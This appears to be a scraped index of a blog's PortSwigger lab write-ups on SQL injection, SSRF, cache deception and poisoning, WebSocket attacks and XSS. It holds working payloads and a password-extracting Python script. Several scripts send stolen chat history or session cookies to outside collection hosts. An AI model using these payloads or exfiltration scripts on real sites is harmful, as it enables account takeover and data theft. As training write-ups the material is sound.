query by performing a SQL injection UNION attack that returns an additional row containing null values.\nWe simply have to determine number of columns in the database using UNION NULL queries\nSolution: Pets' UNION SELECT NULL,NULL,NULL--\n9. Lab: SQL injection UNION attack, finding a column containing text This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.\nThe lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.\nLike last challenge, we have to determine number of column using UNION NULL query and then we have to retrieve the string.\nSolution: Gifts' UNION SELECT NULL,'n1okPs',NULL--\n10. Lab: SQL injection UNION attack, retrieving data from other tables This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.\nVery straightforward challenge, we have been given the table name with column names, we just have to use union query to get creds and then login with that creds. Query: Gifts' UNION SELECT username, password from users--\nSolution: Login with this credentials administrator:1hrjomh0ztxpf3e44mh5\n11. Lab: SQL injection UNION attack, retrieving multiple values in a single column This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.\nFor this challenge, we have to determine how many columns are required and which column contains text and after that we have to concentrate using || ~ || to get username and password with the following query we can able to retrieve information.\nQuery: Pets' UNION SELECT NULL,username || '~' || password FROM users--\nSolution: Login with administrator:taponkgg8eqvhi5679wr\n12. Lab: Blind SQL injection with conditional responses This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nSo, in theory we have to check if the website is vulnerable to SQL Injection with simple condition query. So here is the true case of the query with payload ' AND 1=1--\nWe can see Welcome back! in response. Now let\u0026rsquo;s try to execute false payload query ' AND 1=2--\nWe cannot be able to see Welcome back! in response. So this means that the website is vulnerable to SQL Injection attack. Perfect! Now let\u0026rsquo;s try to use substring query in order to get password.\nSimply using substring script will give us the password. We have to check the character at each position, so I have wrote python script to do the same. If you want to use the same script, you have to change trackingId, session, csrf values.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import string characters = string.ascii_lowercase + string.digits print(characters) passwd = \u0026#34;\u0026#34; for position in range(20): for character in characters: print(f\u0026#39;trying {character} at position {position}\u0026#39;) url = \u0026#39;https://0aa2005204fb8621828dc511004c0081.web-security-academy.net/login\u0026#39; json_data = { \u0026#39;csrf\u0026#39;: \u0026#39;LvxFkchjMqheMJHFbzdAUdFl511exmyD\u0026#39;, \u0026#39;username\u0026#39;: \u0026#39;abc\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;abc\u0026#39; } query = f\u0026#34;S4CgBSuHDyj19tCQ\u0026#39; AND (SELECT SUBSTRING(password,{position+1},1) FROM users WHERE username=\u0026#39;administrator\u0026#39;)=\u0026#39;{character}\u0026#34; cookies = {\u0026#39;TrackingId\u0026#39;: query, \u0026#39;session\u0026#39;: \u0026#39;TUhkJtpGRKK1bUBjaE0pO6BFKKnIgviJ\u0026#39;} response = requests.post(url, cookies=cookies, data=json_data) if \u0026#39;welcome back\u0026#39; in response.text.lower(): passwd += character break position += 1 print(passwd) print(passwd) Solution: Login with administrator:trxkur84glam1e9aymx9\n13. Lab: Blind SQL injection with conditional errors This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nSimilar python program as before, just the query is different.

Lab: Visible error-based SQL injection This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.\nThe database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.\nJust by adding a quote will give us the error.\nNow, let\u0026rsquo;s use CASE query\nIt says the argument must be type boolean, so we have to modify our query based on this error. Modified query is ' AND 1=CAST((SELECT 1) AS int)-- which will not give any error, so that means, the query is valid. Now, let\u0026rsquo;s try to grab usernames from database using this query ' AND 1=CAST((SELECT username FROM users) AS int)--\nThe error says more than one row returned by a subquery used as an expression, so we have to limit the results to 1. So the resultant query will be ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- which will give us the username administrator. Now in order to get the password, simply change username to password in query ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--\nSolution: Login with administrator:b2jg0ij1mwruscn3yflt will solve the lab\n15. Lab: Blind SQL injection with time delays This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nTo solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.\nSimply using sleep payload will solve the lab\nSolution: '||pg_sleep(10)--\n16.

Lab: Basic SSRF against the local server This lab has a stock check feature which fetches data from an internal system.\nTo solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.\nIt is using external API in order to check the stock. So we will change the URL to http://localhost/admin to see, what it renders. In the source code, we will see it is requesting /admin/delete?username=carlos in order to delete carlos user. So we will send that URL in stockAPI to solve the lab.\nSolution: stockApi=http://localhost/admin/delete?username=carlos\n2. Lab: Basic SSRF against another back-end system This lab has a stock check feature which fetches data from an internal system.\nTo solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.\nIn this application, we have to enumerate IP address from 1-255 using intruder and at .3 we will get status code of 200.\nRequesting that IP will give us the results we want!\nSending the request to delete carlos user will solve the lab.\nSolution: Enumerate through octat\n3. Lab: SSRF with blacklist-based input filter This lab has a stock check feature which fetches data from an internal system.\nTo solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.\nThe developer has deployed two weak anti-SSRF defenses that you will need to bypass.\nInstead of localhost, we can use 127.0.0.1, such as 2130706433, 017700000001, or 127.1. In this case, I tried to use http://127.1/admin but it didn\u0026rsquo;t work. So I tried to encode a in admin, still didn\u0026rsquo;t work. Double encoding a worked and gave the results.\nDeleting the carlos user will solve the lab.\nSolution: Use alternative of localhost and url encode characters.\n4.

Lab: Exploiting path mapping for web cache deception To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: wiener:peter.\nHere\u0026rsquo;s how Web Cache Deception Works\nWhen we login into our account (wiener), the application will not add any cache header. We we add /test into the route, then too, it will not add cache header Now, let\u0026rsquo;s try to add /test.js, we can see cache in response header, meaning, it is caching test.js with the max-age of 30. In simple words it will store the response on cache server for 30 seconds. If we try to send the cache link to the victim, it will load the response with victim\u0026rsquo;s data with a cache miss, and when we visit that cached URL it will hit the case (meaning, it will give us the cached victim data). Now sending the URL to victim. Now if we reload the cached URL on our browser, we will see carlos\u0026rsquo;s API Key Solution: Simple Web cache deception with /my-account page.\n2. Lab: Exploiting path delimiters for web cache deception To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: wiener:peter.\nWe have provided a list of possible delimiter characters to help you solve the lab: Web cache deception lab delimiter list.\nSimilar to previous lab, but in this lab, if we add /test the application will say \u0026ldquo;not found\u0026rdquo;. So we have to use delimiter. We can use Intruder to find it. (Make sure to turn off URL encoding).\nWe found 2 delimiters. ? and ;\nNext, we will use ;test.js to check if the response is getting cached. In this case, yes, it\u0026rsquo;s cached!\nNow we will send the link to carlos and use caching to get the API key.\nSolution: Find the delimiter to end the URL\n3. Lab: Exploiting origin server normalization for web cache deception To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: wiener:peter.\nWe have provided a list of possible delimiter characters to help you solve the lab: Web cache deception lab delimiter list.\nNow as we found the response with Cache header, we will move forward with delimiter. I tested path delimiters and found that only ? worked. Then I checked normalization by adding encoded dot-segments like ..%2f, and the server resolved them while the cache didn’t. The /resources prefix turned out to have a static directory cache rule, so I combined that with the dot-segment trick to serve sensitive content from cache. Finally, I built an exploit that redirected the victim to a crafted URL, which cached their API key. After that, I just grabbed the key and submitted it to finish the lab.\nPayload: \u0026lt;script\u0026gt;document.location=\u0026quot;https://0a9e002a048706f980de173800b50059.web-security-academy.net/resources/..%2fmy-account?test\u0026quot;\u0026lt;/script\u0026gt;\nSolution: Exploited path and cache handling quirks with ..%2f to trick the cache and steal the victim’s API key.\n","description":"A collection of portswigger web cache deception writeups with examples, notes and writeups.","id":24,"section":"Portswigger","tags":["Portswigger","WEB-CACHE-DECEPTION"],"title":"Portswigger Web Cache Deception Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-web-cache-deception/"},{"content":"1. Lab: Web cache poisoning with an unkeyed header This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site\u0026rsquo;s home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor\u0026rsquo;s browser.\nWe will check with param miner extension if there is any unkeyed headers, and we got X-Forwarded-For header, so I have tried to enter example.com in the header and it got reflected in the response. So I have modified with the XSS payload and it worked!\nPayload: X-Forwarded-Host: test.com\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;\n2. Lab: Web cache poisoning with an unkeyed cookie This lab is vulnerable to web cache poisoning because cookies aren\u0026rsquo;t included in the cache key. An unsuspecting user regularly visits the site\u0026rsquo;s home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor\u0026rsquo;s browser.\nIn this application, it is setting fehost cookie which is reflected in the response, so we will use XSS payload instead of the actual cookie.\nPayload Cookie: fehost=\u0026quot;-alert(1)-\u0026quot;\n3. Lab: Web cache poisoning with multiple headers This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor\u0026rsquo;s browser.\nI started by experimenting with cache poisoning vectors. Adding a cache-buster query parameter along with the X-Forwarded-Host: example.com header produced no effect. However, switching to the X-Forwarded-Scheme header revealed more. Any value other than HTTPS caused the server to issue a 302 redirect, and the Location header clearly showed that I was being redirected to the same resource but over https://.\nThe real breakthrough came when I combined the two headers: X-Forwarded-Host: example.com and X-Forwarded-Scheme: nothttps. This time, the Location header pointed to https://example.com/, showing that I could influence the cache key and potentially poison it.\nWith this confirmed, I moved to the exploit server. I created a malicious file under the exact same path as the vulnerable JavaScript: /resources/js/tracking.js.\nBody payload: alert(document.cookie)\nHeaders: X-Forwarded-Host: \u0026lt;YOUR-EXPLOIT-SERVER-ID\u0026gt;.exploit-server.net and X-Forwarded-Scheme: nothttps\nFinally, I removed the cache-buster and replayed the request until I re-poisoned the cache without extra parameters. When I reloaded the home page as if I were a victim, the browser executed the script and triggered alert(document.cookie). By keeping the cache poisoned until a real user visited, the attack successfully forced them to load my malicious JavaScript, completing the lab.\n4. Lab: Targeted web cache poisoning using an unknown header This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor\u0026rsquo;s browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.\n5. Lab: Web cache poisoning via an unkeyed query string This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site\u0026rsquo;s home page using Chrome.\nTo solve the lab, poison the home page with a response that executes alert(1) in the victim\u0026rsquo;s browser.\nI experimented with arbitrary query parameters in the request and observed that the server still returned a cache hit even when the parameters changed. This indicated that query parameters were not included in the cache key. Next, I tested the Origin header as a cache buster. Adding it to the request resulted in cache misses, which confirmed that this header could be used to manipulate cache behavior.\nWhen I triggered a cache miss, I noticed that my injected parameters were reflected in the server’s response. This meant that if such a response were cached, the reflected payload would persist even after removing the query parameters. With this in mind, I injected an XSS payload by breaking out of the reflected string: GET /?evil='/\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\nFinally, I removed the Origin header and placed my XSS payload directly in the query string. I replayed this request until I successfully poisoned the cache for normal users. Loading the home page in a browser confirmed the attack: the popup executed as the injected payload was served from cache.\n6. Lab: Web cache poisoning via an unkeyed query parameter This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site\u0026rsquo;s home page using Chrome.\nTo solve the lab, poison the cache with a response that executes alert(1) in the victim\u0026rsquo;s browser.\nSame as before, this time we have to guess GET request\nSend a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:\nGET /?utm_content='/\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n7. Lab: Parameter cloaking This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site\u0026rsquo;s home page using Chrome.\nTo solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim\u0026rsquo;s browser.\nThe lab is vulnerable due to Rails parameter cloaking. The utm_content parameter is excluded from the cache key, and appending a semicolon (;) allows you to smuggle in a second parameter, such as callback. Every page loads /js/geolocate.js, which executes a callback function. Normally, callback is keyed, but when appended via utm_content, it isn’t.\nPayload: GET /js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=foo;callback=alert(1)\nthe cache key ignores the second parameter, but the response executes it. Once cached, any page loading geolocate.js will trigger alert(1).\n8. Lab: Web cache poisoning via a fat GET request This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site\u0026rsquo;s home page using Chrome.\nTo solve the lab, poison the cache with a response that executes alert(1) in the victim\u0026rsquo;s browser.\nEvery page loads /js/geolocate.js with the callback setCountryCookie(). You send:\nGET /js/geolocate.js?callback=setCountryCookie\nto Burp Repeater and add a duplicate callback parameter in the request body. The response executes the last callback while the cache key still uses the first one from the request line.\nFor example:\nGET /js/geolocate.js?callback=setCountryCookie callback=alert(1)\nResponse:\nX-Cache-Key: /js/geolocate.js?callback=setCountryCookie alert(1)({\u0026quot;country\u0026quot;:\u0026quot;United Kingdom\u0026quot;})\nThis poisons the cached response with your malicious callback.\n9. Lab: URL normalization This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.\nTo solve the lab, take advantage of the cache\u0026rsquo;s normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim\u0026rsquo;s browser. Then, deliver the malicious URL to the victim.\nFirst, send a request to a non-existent path like GET /random in Burp Repeater and observe that the requested path is reflected in the error message. Inject an XSS payload directly into the path, for example:\nGET /random\u0026lt;/p\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;p\u0026gt;foo\nWhen tested directly in the browser, the payload won’t execute because the browser URL-encodes it. However, if you poison the cache with this payload in Burp Repeater and then load the same URL in the browser, the payload executes — this happens because the cache stores the decoded version, resulting in a cache hit with the injected script.\nFinally, re-poison the cache and immediately submit the malicious URL using the \u0026ldquo;Deliver link to victim\u0026rdquo; option in the lab. The victim’s visit triggers the payload, solving the lab. ✅\n","description":"A collection of portswigger web cache poisoning writeups with examples, notes and writeups.","id":25,"section":"Portswigger","tags":["Portswigger","WEB-CACHE-POISONING"],"title":"Portswigger Web Cache Poisoning Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-web-cache-poisoning/"},{"content":"1. Lab: Manipulating WebSocket messages to exploit vulnerabilities This online shop has a live chat feature implemented using WebSockets.\nChat messages that you submit are viewed by a support agent in real time.\nTo solve the lab, use a WebSocket message to trigger an alert() popup in the support agent\u0026rsquo;s browser.\nIn this application, there is a chat message section where user will send message and it will be set to UI using innerHTML.\nSo instead of sending \u0026ldquo;test\u0026rdquo; we will send XSS payload in order to do alert.\nUsing \u0026lt;img src=1 onerror='alert(1)'\u0026gt; we can able to solve the lab.\n2. Lab: Manipulating the WebSocket handshake to exploit vulnerabilities This online shop has a live chat feature implemented using WebSockets.\nIt has an aggressive but flawed XSS filter.\nTo solve the lab, use a WebSocket message to trigger an alert() popup in the support agent\u0026rsquo;s browser.\nA message is sent and captured in Burp’s WebSockets history, then forwarded to Repeater for modification. When a basic XSS payload is injected and sent (\u0026lt;img src=1 onerror='alert(1)'\u0026gt;), the system blocks the attack and terminates the WebSocket connection, banning the user’s IP. By spoofing the IP with the X-Forwarded-For header in the handshake request, the tester successfully reconnects. Finally, an obfuscated XSS payload is sent to bypass the filter and attempt code execution.\n1 \u0026lt;img src=1 oNeRrOr=alert`1`\u0026gt; 3. Lab: Cross-site WebSocket hijacking This online shop has a live chat feature implemented using WebSockets.\nTo solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim\u0026rsquo;s chat history, then use this gain access to their account.\nTo exploit the WebSocket vulnerability, first open Live Chat and send a message, then reload the page. In Burp Suite, observe in the WebSockets history tab that the \u0026quot;READY\u0026quot; command retrieves past chat messages from the server. In the HTTP history tab, locate the WebSocket handshake request and note that it does not contain any CSRF tokens. Copy the handshake request URL and use it in the exploit server by pasting the following payload into the body:\n1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; var ws = new WebSocket(\u0026#39;wss://0ad5004f03d8440d8106b68100090082.web-security-academy.net/chat\u0026#39;); ws.onopen = function() { ws.send(\u0026#34;READY\u0026#34;); }; ws.onmessage = function(event) { fetch(\u0026#39;https://collaborator.oastify.com\u0026#39;, {method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: event.data}); }; \u0026lt;/script\u0026gt; After clicking View exploit, poll for interactions in the Collaborator tab and confirm that the attack exfiltrates chat history, with each message sent as an HTTP request body in JSON format (though not always in order). Finally, deliver the exploit to the victim via the exploit server and poll Collaborator again to capture the victim’s chat history, which will include their username and password.

Lab: DOM XSS in document.write sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.\nWell if we can see the source after searching, this is the JS code.\nIt is using location.search to get the parameter and then adding the image with query using document.write. So if we escape the quote and write our payload, it will give us alert.\nSolution: '\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n4. Lab: DOM XSS in document.write sink using source location.search inside a select element This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.\nIf we see the source of webpage, we will see it is using storeId parameter from URL. So we have to add that to our URL, now what payload do we use?\nFrom the image we can see it is using document.write and inside that it is using \u0026lt;option\u0026gt; tag. Now in order to make our XSS work, we have to close option tag and then call script alert.\nSolution: ?productId=2\u0026amp;storeId=\u0026lt;/option\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n5. Lab: DOM XSS in innerHTML sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.\nLet\u0026rsquo;s see the source code.\nWe can see website is using innerHTML. The innerHTML sink doesn\u0026rsquo;t accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements.\nSolution: \u0026quot;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\n6. Lab: Reflected XSS into HTML context with all tags blocked except custom ones This lab blocks all HTML tags except custom ones.\nTo solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.\nIn this lab, if we try to use common HTML tags, it will give us tag not allowed response.\nSo, in order to use the custom tags, we can reference cheatsheet provided by portswigger - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet. We can use custom tag like \u0026lt;custom-tag\u0026gt;, \u0026lt;xss\u0026gt; or it can be anything. But the 3 important thing in custom tag is the id, tabindex and #x. id is used to reference the tag, onfocus is used to call alert function when the element is focused. But how can we focus to the tag? Using tabindex. Yes, we have to make the custom tag tag indexable and using #x we can call that index and make it focus and it will call alert function. It is complicated but if we understand HTML tags underneath how it works, then it is fairly simple!\nPayload: \u0026lt;xss id=x onfocus=alert(document.cookie) tabindex=1\u0026gt;#x\nIn order to solve the lab, we have to exploit server and paste this in body.\n1 \u0026lt;script\u0026gt; location = \u0026#39;https://0a63009503c3633b80cd760f00f500e6.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x\u0026#39;; \u0026lt;/script\u0026gt; Solution: \u0026lt;xss id=x onfocus=alert(document.cookie) tabindex=1\u0026gt;#x\n7. Lab: Reflected XSS with event handlers and href attributes blocked This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.\nTo solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.\nNote that you need to label your vector with the word \u0026ldquo;Click\u0026rdquo; in order to induce the simulated lab user to click your vector. For example:\n\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Click me\u0026lt;/a\u0026gt;\nAlright, so for this lab, some tags and attributes are not allowed. If you try to use \u0026lt;h1\u0026gt; or \u0026lt;script\u0026gt; it will give us tags not allowed. Moreover, some attributes are also not allowed. In the challenge it says we have to use Click me with \u0026lt;a\u0026gt; tag, so I am guessing \u0026lt;a\u0026gt; is allowed. After fuzzing some inputs, I have found out that \u0026lt;animate\u0026gt; is also allowed. We can simply use similar payload to this - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-animate-tag-using-values\nSo in our payload, we are sure that \u0026lt;a\u0026gt; is allowed, \u0026lt;animate\u0026gt; is also allowed. Moreover, animate tag is a part of \u0026lt;svg\u0026gt; tag, so I am guessing that is also allowed. We have to render text containing click so \u0026lt;text\u0026gt; is also allowed. Now, make a payload based on this.\nSolution: payload - \u0026lt;svg\u0026gt;\u0026lt;a\u0026gt;\u0026lt;animate attributeName=href values=javascript:alert(1) /\u0026gt;\u0026lt;text x=20 y=20\u0026gt;Click\u0026lt;/text\u0026gt;\u0026lt;/a\u0026gt;\n8. Lab: Reflected XSS with some SVG markup allowed This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.\nTo solve the lab, perform a cross-site scripting attack that calls the alert() function.\nIn this challenge, \u0026lt;svg\u0026gt; is allowed, whereas \u0026lt;a\u0026gt; and \u0026lt;animate\u0026gt; is not. From the cheatsheet, I have tried several payload, but none of them work. As animate is not working, I have tried other payload animatemotion, but it didn\u0026rsquo;t work. \u0026lt;animatetransform\u0026gt; did work actually.\nThe first payload itself worked for me: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbegin\nSolution: \u0026lt;svg\u0026gt;\u0026lt;animatetransform onbegin=alert(1) attributeName=transform\u0026gt;\n9. Lab: Reflected XSS into attribute with angle brackets HTML-encoded This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.\nFor this challenge, I have tried entering \u0026quot;\u0026gt;\u0026lt;script\u0026gt; in search and checked where the values is reflected. On checking the source, we can see it\u0026rsquo;s in \u0026lt;h1\u0026gt; tag, where it is encoded, and second is in value tag, again encoded. We cannot do anything inside \u0026lt;h1\u0026gt; so we will close value tag and add new onfocus attribute and check for XSS.\nSolution: \u0026quot; autofocus onfocus=alert(1) x=\u0026quot;\n10. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.\nSimilar to last challenge, I have entered abc, def etc in comment section and made a comment, while checking source code we can see that in href URL is present. We can enter javascript:alert(1) in URL to make it work.\nSolution: javascript:alert(1)\n11. Lab: Reflected XSS in canonical link tag This lab reflects user input in a canonical link tag and escapes angle brackets.\nTo solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.\nPlease note that the intended solution to this lab is only possible in Chrome.\nNoticed in this lab there is no search field. Where should we enter payload? In the URL itself after /? If we try to use /?abcd in website and check the source if it is getting reflected.\nYes, it does! in \u0026lt;link\u0026gt;. So we have to break out of that string using ' and then use onclick in order to call alert. But for this lab we have to use access key. So we will set accesskey to X and finally we can able to generate a payload out of it.\nSolution: Payload ?'accesskey='x'onclick='alert(1)\n12. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.\nwe have to escape quote in order to make our exploit work. If we search \u0026lsquo;abc\u0026rsquo; and check source, we will see it is inside a quote.\nIf we escape the quote, close script tag and then alert with new script tags then it will give XSS.\nSolution: '\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n13. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.\nI have used similar payload from previous challenge, and we can observe that angle bracket is encoded.\nso we will simply use '; to escape string character and use alert followed by // to comment everything after the alert.\nSolution: ';alert(1)//\n14. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.\nIf you try with previous payload, you will notice it will add \\ to escape ' character. What we will do it add one more backslash \\ so it will backslash backslash. Sounds weird, haha.\nSolution: \\';alert(1)//\n15. Lab: Reflected XSS in a JavaScript URL with some characters blocked This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.\nAt first glance of website, there is no search functionality. But when you visit a blog website the URL will be /post?postId=2 if we append 2\u0026amp;abc in postId then we can see abc is reflected in source code.\nNext, I have tried escaping ' and a tag using this payload 2\u0026amp;'\u0026lt;/a\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; but everything is encoded.\nIn order to solve this lab, we have to understand this article - https://portswigger.net/research/xss-without-parentheses-and-semi-colons. In order to make our XSS work, we have to close } bracket. So \u0026amp;'} will be the starting point for this challenge. Next we have the access to JavaScript. We will define a variable named as foo and then throw an exception with alert 1337.\nSolution: 5\u0026amp;'},foo=foo=\u0026gt;{throw/**/onerror=alert,1337},toString=foo,window+'',{foo:'\n16. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve this lab, submit a comment that calls the alert function when the comment author name is clicked.\nLet\u0026rsquo;s inspect the comment section by submitting dummy data into the form.\nSo we we can see, in onclick we can able to bypass using website. So in order to bypass this I have made this payload http://google.com'');alert(1 but it seems when the user is clicked, it is redirecting us to http://google.com/'/');alert(1. Also it is escaping quote in onclick. So the payload will be encoded with \u0026amp;apos;.\nSolution: http://google.com?#\u0026amp;apos;-alert(1)-\u0026amp;apos;\n17. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.\nIf we look at source code, it is having template string. We just have to use this format in order to get the flag. ${}\nSolution: ${alert(1)}\n18. Lab: Exploiting cross-site scripting to steal cookies This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim\u0026rsquo;s session cookie, then use this cookie to impersonate the victim.\nStarting with this challenges, we will have to see if it is popping alert, so simply using \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; we give us the idea of where the alert is getting popped.\nPayload: \u0026quot;\u0026gt;\u0026lt;script\u0026gt;document.location=\u0026quot;https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8?c=\u0026quot;+document.cookie\u0026lt;/script\u0026gt;. Though this is valid payload, we can also use alternate payload: \u0026lt;script\u0026gt;fetch(\u0026quot;https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8?cookie=\u0026quot;+document.cookie);\u0026lt;/script\u0026gt;\nSolution: Change the cookie and go to /my-account and it will solve the 